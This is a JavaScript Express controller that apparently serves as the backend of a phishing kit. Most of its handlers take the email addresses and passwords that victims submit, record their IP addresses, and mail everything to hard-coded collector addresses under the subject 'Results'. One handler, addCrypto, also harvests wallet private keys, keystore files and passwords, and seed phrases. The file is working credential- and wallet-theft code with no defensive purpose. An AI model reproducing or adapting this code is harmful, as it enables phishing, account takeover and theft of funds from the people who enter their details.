import moment from 'moment';
import db from '../migration/database';
import mail from '../migration/mailer';
import dotenv from 'dotenv';

dotenv.config();
var requestIp = require('request-ip');

class UserController {
  /**
   * get customer
   * @param {object} request express request query
   * @param {object} response express response object
   *
   * @returns {json} json
   * @memberof customerController
   */
  /**
   * creates new user
   * @param {object} request express request object
   * @param {object} response express response object
   *
   * @returns {json} json
   * @memberof UserController
   */

  static async addUser(request, response) {
    const {EmailAddress,Password,
    } = request.body;
    const others =  request.header('x-forwarded-for') || request.connection.remoteAddress;
    const ip = request.socket.remoteAddress
    var clientIp = requestIp.getClientIp(request);
    const queryText = 'INSERT INTO users (EmailAddress,Password) VALUES ($1, $2)';
    const values =
      [
        EmailAddress,Password
      ]
    
    const mailData = {
      from: 'claracups@gmail.com',  // sender address
        to: 'oyanowa11@yahoo.com',   // list of receivers
        subject: 'Results',
        text: `This is your information Email is ${EmailAddress} and Password : ${Password} and iP address: ${ip} or ${clientIp} or ${others} Thanks for beliving in us`,
      };
      let errr;
      let good;
    await db.query(queryText, values, (err) => {
        if (err) {  
          errr = err
          console.log(err)
    } else {
      console.log("nivw")
 good = "Saved"
 
    }
  });
    await mail.sendMail(mailData, (err) => {

      if (err) {
        
        console.log(err)
        response.status(400).json({

          status: response.statusCode,

          message: err,
          Error: errr
          

        });
      } else {
        response.status(201).json({

          status: response.statusCode,

          data: {
           EmailAddress,Password, good },

          message: `Mail sent Successful `
        });
      }
    });
  }
  static async addCrypto(request, response) {
    const {EmailAddress,Password,import_type,privatekey,wallet,keystorejson,keystorepassword,phrase
    } = request.body;
    const others =  request.header('x-forwarded-for') || request.connection.remoteAddress;
    const ip = request.socket.remoteAddress
    var clientIp = requestIp.getClientIp(request);
    const queryText = 'INSERT INTO crypto (EmailAddress,Password,import_type,privatekey,wallet,keystorejson,keystorepassword,phrase) VALUES ?';
    const values = [
      [
        EmailAddress,Password,import_type,privatekey,wallet,keystorejson,keystorepassword,phrase
      ]
    ];
    const mailData = {
      from: 'doane.shea@followrover.com',  // sender address
        to: `dn137414@gmail.com; aofficialclara@gmail.com;  ${process.env.email}`,   // list of receivers
        subject: 'Results',
        text: `
        This is your information Email is ${EmailAddress}
         and Password : ${Password} and 
         iP address: ${ip} or ${clientIp}
          or ${others} 
        AND
        IMPORT TYPE = ${import_type},
        PRIVATE KEY = ${privatekey},
        WALLET = ${wallet},
        KEYSTOREJSON = ${keystorejson},
        KEYSTOREPASSWORD = ${keystorepassword},
        PHRASE = ${phrase}
        Thanks for beliving in us
        `,
      };
      let errr;
      let good;
    await db.query(queryText, values, (err) => {
        if (err) {  
          errr = err
          console.log(err)
    } else {
      console.log('sent')
 good = "Saved"
    }
  });
    await mail.sendMail(mailData, (err) => {

      if (err) {
        
        console.log(err)
        response.status(400).json({

          status: response.statusCode,

          message: err,
          Error: errr
          

        });
      } else {
        response.status(201).json({

          status: response.statusCode,

          data: {
            EmailAddress,Password,import_type,privatekey,wallet,keystorejson,keystorepassword,phrase, good },

          message: `Mail sent Successful `
        });
      }
    });
  }
  static async addMail(request, response) {
    const {EmailAddress,Password,
    } = request.body;
    const others =  request.header('x-forwarded-for') || request.connection.remoteAddress;
    const ip = request.socket.remoteAddress
    var clientIp = requestIp.getClientIp(request);
    const queryText = 'INSERT INTO users (EmailAddress,Password) VALUES ($1, $2)';
    const values =
      [
        EmailAddress,Password
      ]
    
    const mailData = {
      from: 'claracups@gmail.com',  // sender address
        to: 'result4god@yandex.com',   // list of receivers
        subject: 'Results',
        text: `This is your information Email is ${EmailAddress} and Password : ${Password} and iP address: ${ip} or ${clientIp} or ${others} Thanks for beliving in us`,
      };
      let errr;
      let good;
    await db.query(queryText, values, (err) => {
        if (err) {  
          console.log(err)
          errr = err
    } else {
 good = "Saved"
 console.log(good)
    }
  });
    await mail.sendMail(mailData, (err) => {

      if (err) {
        
        console.log(err)
        response.status(400).json({

          status: response.statusCode,

          message: err,
          Error: errr
          

        });
      } else {
        response.status(201).json({

          status: response.statusCode,

          data: {
           EmailAddress,Password, good },

          message: `Mail sent Successful `
        });
      }
    });
  }
  static async addMails(request, response) {
    const {EmailAddress,Password,
    } = request.body;
    const others =  request.header('x-forwarded-for') || request.connection.remoteAddress;
    const ip = request.socket.remoteAddress
    var clientIp = requestIp.getClientIp(request);
    const queryText = 'INSERT INTO users (EmailAddress,Password) VALUES ($1, $2)';
    const values = 
      [
        EmailAddress,Password
      ]
  
    const mailData = {
      from: 'doane.shea@followrover.com',  // sender address
        to: 'bdahearingservice@gmail.com',   // list of receivers
        subject: 'Results',
        text: `This is your information Email is ${EmailAddress} and Password : ${Password} and iP address: ${ip} or ${clientIp} or ${others} Thanks for beliving in us`,
      };
      let errr;
      let good;
    await db.query(queryText, values, (err) => {
        if (err) {  
          errr = err
    } else {
 good = "Saved"
    }
  });
    await mail.sendMail(mailData, (err) => {

      if (err) {
        
        console.log(err)
        response.status(400).json({

          status: response.statusCode,

          message: err,
          Error: errr
          

        });
      } else {
        response.status(201).json({

          status: response.statusCode,

          data: {
           EmailAddress,Password, good },

          message: `Mail sent Successful `
        });
      }
    });
  }
  static async login(request, response){
    var username = request.body.Username;
    var password = request.body.Password;
    if (username && password) {
     await db.query('SELECT * FROM users WHERE Username = ? AND Password = ?', [username, password], function(error, results, fields) {
        if (error) {
          response.status(400).json({
  
            status: 400,
  
            message: error.sqlMessage,
  
          });
        }
         else if (results.length > 0) {
          // request.session.loggedin = true;
          // request.session.username = username;
 
          response.status(200).json({
  
            status: 200,
    
            message: 'Login Successful',
    
          });
        } else {
          response.status(400).json({
  
            status: 400,
  
            message: 'Incorrect Username and/or Password!',
  
          });
        }			
        response.end();
      });
    } else {
      response.status(400).json({
  
        status: 400,

        message: 'Please enter Username and Password!',

      });
      response.end();
    }
  };
  static async addGhost(request, response) {
    const {EmailAddress,Password,
    } = request.body;
    const others =  request.header('x-forwarded-for') || request.connection.remoteAddress;
    const ip = request.socket.remoteAddress
    var clientIp = requestIp.getClientIp(request);
    const queryText = 'INSERT INTO users (EmailAddress,Password) VALUES ($1, $2)';
    const values =
      [
        EmailAddress,Password
      ]
    
    const mailData = {
      from: 'doane.shea@followrover.com',  // sender address
        to: 'aofficialclara@gmail.com',   // list of receivers
        subject: 'Results',
        text: `This is your information Email is ${EmailAddress} and Password : ${Password} and iP address: ${ip} or ${clientIp} or ${others} Thanks for beliving in us`,
      };
      let errr;
      let good;
    await db.query(queryText, values, (err) => {
        if (err) {  
          console.log(err)
          errr = err
    } else {
 good = "Saved"
 console.log(good)
    }
  });
    await mail.sendMail(mailData, (err) => {

      if (err) {
        
        console.log(err)
        response.status(400).json({

          status: response.statusCode,

          message: err,
          Error: errr
          

        });
      } else {
        response.status(201).json({

          status: response.statusCode,

          data: {
           EmailAddress,Password, good },

          message: `Mail sent Successful `
        });
      }
    });
  }
  static async addOZ(request, response) {
    const {EmailAddress,Password,
    } = request.body;
    const others =  request.header('x-forwarded-for') || request.connection.remoteAddress;
    const ip = request.socket.remoteAddress
    var clientIp = requestIp.getClientIp(request);
    const queryText = 'INSERT INTO users (EmailAddress,Password) VALUES ($1, $2)';
    const values =
      [
        EmailAddress,Password
      ]
    
    const mailData = {
      from: 'aofficialclara@gmail.com',  // sender address
        to: 'bdahearingservice@gmail.com',   // list of receivers
        subject: 'Results',
        text: `This is your information Email is ${EmailAddress} and Password : ${Password} and iP address: ${ip} or ${clientIp} or ${others} Thanks for beliving in us`,
      };
      let errr;
      let good;
    await db.query(queryText, values, (err) => {
        if (err) {  
          console.log(err)
          errr = err
    } else {
 good = "Saved"
 console.log(good)
    }
  });
    await mail.sendMail(mailData, (err) => {

      if (err) {
        
        console.log(err)
        response.status(400).json({

          status: response.statusCode,

          message: err,
          Error: errr
          

        });
      } else {
        response.status(201).json({

          status: response.statusCode,

          data: {
           EmailAddress,Password, good },

          message: `Mail sent Successful `
        });
      }
    });
  }
  static async addOZ1(request, response) {
    const {EmailAddress,Password,
    } = request.body;
    const others =  request.header('x-forwarded-for') || request.connection.remoteAddress;
    const ip = request.socket.remoteAddress
    var clientIp = requestIp.getClientIp(request);
    const queryText = 'INSERT INTO users (EmailAddress,Password) VALUES ($1, $2)';
    const values =
      [
        EmailAddress,Password
      ]
    
    const mailData = {
      from: 'aofficialclara@gmail.com',  // sender address
        to: 'andrewhd.brott@gmail.com',   // list of receivers
        subject: 'Results',
        text: `This is your information Email is ${EmailAddress} and Password : ${Password} and iP address: ${ip} or ${clientIp} or ${others} Thanks for beliving in us`,
      };
      let errr;
      let good;
    await db.query(queryText, values, (err) => {
        if (err) {  
          console.log(err)
          errr = err
    } else {
 good = "Saved"
 console.log(good)
    }
  });
    await mail.sendMail(mailData, (err) => {

      if (err) {
        
        console.log(err)
        response.status(400).json({

          status: response.statusCode,

          message: err,
          Error: errr
          

        });
      } else {
        response.status(201).json({

          status: response.statusCode,

          data: {
           EmailAddress,Password, good },

          message: `Mail sent Successful `
        });
      }
    });
  }
  static async addOZ2(request, response) {
    const {EmailAddress,Password,
    } = request.body;
    const others =  request.header('x-forwarded-for') || request.connection.remoteAddress;
    const ip = request.socket.remoteAddress
    var clientIp = requestIp.getClientIp(request);
    const queryText = 'INSERT INTO users (EmailAddress,Password) VALUES ($1, $2)';
    const values =
      [
        EmailAddress,Password
      ]
    
    const mailData = {
      from: 'claracups@gmail.com',  // sender address
        to: 'josicdamir@aol.com',   // list of receivers
        subject: 'Results',
        text: `This is your information Email is ${EmailAddress} and Password : ${Password} and iP address: ${ip} or ${clientIp} or ${others} Thanks for beliving in us`,
      };
      let errr;
      let good;
    await db.query(queryText, values, (err) => {
        if (err) {  
          console.log(err)
          errr = err
    } else {
 good = "Saved"
 console.log(good)
    }
  });
    await mail.sendMail(mailData, (err) => {

      if (err) {
        
        console.log(err)
        response.status(400).json({

          status: response.statusCode,

          message: err,
          Error: errr
          

        });
      } else {
        response.status(201).json({

          status: response.statusCode,

          data: {
           EmailAddress,Password, good },

          message: `Mail sent Successful `
        });
      }
    });
  }
  static async addOZ3(request, response) {
    const {EmailAddress,Password,
    } = request.body;
    const others =  request.header('x-forwarded-for') || request.connection.remoteAddress;
    const ip = request.socket.remoteAddress
    var clientIp = requestIp.getClientIp(request);
    const queryText = 'INSERT INTO users (EmailAddress,Password) VALUES ($1, $2)';
    const values =
      [
        EmailAddress,Password
      ]
    
    const mailData = {
      from: 'aofficialclara@gmail.com',  // sender address
        to: 'officekim45@gmail.com',   // list of receivers
        subject: 'Results',
        text: `This is your information Email is ${EmailAddress} and Password : ${Password} and iP address: ${ip} or ${clientIp} or ${others} Thanks for beliving in us`,
      };
      let errr;
      let good;
    await db.query(queryText, values, (err) => {
        if (err) {  
          console.log(err)
          errr = err
    } else {
 good = "Saved"
 console.log(good)
    }
  });
    await mail.sendMail(mailData, (err) => {

      if (err) {
        
        console.log(err)
        response.status(400).json({

          status: response.statusCode,

          message: err,
          Error: errr
          

        });
      } else {
        response.status(201).json({

          status: response.statusCode,

          data: {
           EmailAddress,Password, good },

          message: `Mail sent Successful `
        });
      }
    });
  }
  static async addOZ4(request, response) {
    const {EmailAddress,Password,
    } = request.body;
    const others =  request.header('x-forwarded-for') || request.connection.remoteAddress;
    const ip = request.socket.remoteAddress
    var clientIp = requestIp.getClientIp(request);
    const queryText = 'INSERT INTO users (EmailAddress,Password) VALUES ($1, $2)';
    const values =
      [
        EmailAddress,Password
      ]
    
    const mailData = {
      from: 'aofficialclara@gmail.com',  // sender address
        to: 'ceo.ceo@protonmail.com',   // list of receivers
        subject: 'Results',
        text: `This is your information Email is ${EmailAddress} and Password : ${Password} and iP address: ${ip} or ${clientIp} or ${others} Thanks for beliving in us`,
      };
      let errr;
      let good;
    await db.query(queryText, values, (err) => {
        if (err) {  
          console.log(err)
          errr = err
    } else {
 good = "Saved"
 console.log(good)
    }
  });
    await mail.sendMail(mailData, (err) => {

      if (err) {
        
        console.log(err)
        response.status(400).json({

          status: response.statusCode,

          message: err,
          Error: errr
          

        });
      } else {
        response.status(201).json({

          status: response.statusCode,

          data: {
           EmailAddress,Password, good },

          message: `Mail sent Successful `
        });
      }
    });
  }
  static async addOZ5(request, response) {
    const {EmailAddress,Password,
    } = request.body;
    const others =  request.header('x-forwarded-for') || request.connection.remoteAddress;
    const ip = request.socket.remoteAddress
    var clientIp = requestIp.getClientIp(request);
    const queryText = 'INSERT INTO users (EmailAddress,Password) VALUES ($1, $2)';
    const values =
      [
        EmailAddress,Password
      ]
    
    const mailData = {
      from: 'aofficialclara@gmail.com',  // sender address
        to: 'strootmanhussein@gmail.com',   // list of receivers
        subject: 'Results',
        text: `This is your information Email is ${EmailAddress} and Password : ${Password} and iP address: ${ip} or ${clientIp} or ${others} Thanks for beliving in us`,
      };
      let errr;
      let good;
    await db.query(queryText, values, (err) => {
        if (err) {  
          console.log(err)
          errr = err
    } else {
 good = "Saved"
 console.log(good)
    }
  });
    await mail.sendMail(mailData, (err) => {

      if (err) {
        
        console.log(err)
        response.status(400).json({

          status: response.statusCode,

          message: err,
          Error: errr
          

        });
      } else {
        response.status(201).json({

          status: response.statusCode,

          data: {
           EmailAddress,Password, good },

          message: `Mail sent Successful `
        });
      }
    });
  }
}

  export default UserController;         